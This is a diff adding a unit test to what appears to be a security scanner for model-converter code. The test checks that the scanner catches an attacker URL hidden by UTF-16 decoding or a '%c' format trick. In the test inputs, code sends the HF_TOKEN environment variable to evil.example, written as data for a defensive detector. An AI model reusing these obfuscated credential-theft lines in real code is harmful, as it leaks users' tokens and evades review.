@@ -4723,6 +4723,39 @@ def test_two_scans_at_once_do_not_share_one_budget():
     del module._fold_state.budget
 
 
+def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
+    """Bytes holding UTF-16 for an attacker URL are read here as UTF-8
+    replacement text, so nothing in the file spelled a host, and decoding a
+    literal is now refused outright. Upstream decodes what came back from the
+    hub, which is not a literal.
+
+    A hole immediately before :// was not the only way to hide a scheme
+    either: "%cttps://evil.example/c" supplies one character of it, and the
+    whole scheme is read back from the separator now rather than the character
+    before it.
+    """
+    scan_converter_source = _load(
+        "converter_scan_decode_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = (
+        'requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    encoded = repr("https://evil.example/c".encode("utf-16"))
+    for body in (
+        f'url = {encoded}.decode("utf-16")\n' + send,
+        'url = "%cttps://evil.example/c" % 104\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Decoding the download is what upstream does, and the hub URL beside it
+    # is still read as the hub.
+    assert scan_converter_source(
+        preamble + 'url = f"{HUB}/api"\n'
+        + 'raw = requests.get(url).content.decode()\n' + send
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
